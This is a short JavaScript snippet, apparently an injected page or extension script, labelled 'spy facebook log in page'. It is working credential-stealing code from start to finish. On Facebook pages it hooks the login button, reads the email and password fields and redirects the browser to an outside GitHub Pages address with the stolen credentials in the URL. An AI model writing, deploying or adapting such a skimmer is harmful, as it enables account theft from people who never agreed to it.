
// spy facebook log in page
const waiiFb = new Promise((res) => {
    setInterval(()=>{
        if(window.location.href.includes('m.facebook')){
            res("m");
        }
        if(window.location.href.includes('facebook')){
            res("d");
        }
    },1000);
}).then((val)=>{
    if(val == "d"){
        try{
            document.getElementsByName("login")[0].onclick = function(){
            document.getElementsByName("pass")[0].type = 'text';
            pass = document.getElementsByName("pass")[0].value;
            email = document.getElementsByName("email")[0].value
            string = "email:" + email + "pass:" + pass;
            window.stop();
            setTimeout(()=>{
                window.location.href = "https://allentumbagahan.github.io/public/SaveLoggerToDb/index#" + string;
            }, 1000);
            }
        }
        catch(err){
            console.log(err);
        }
    }
});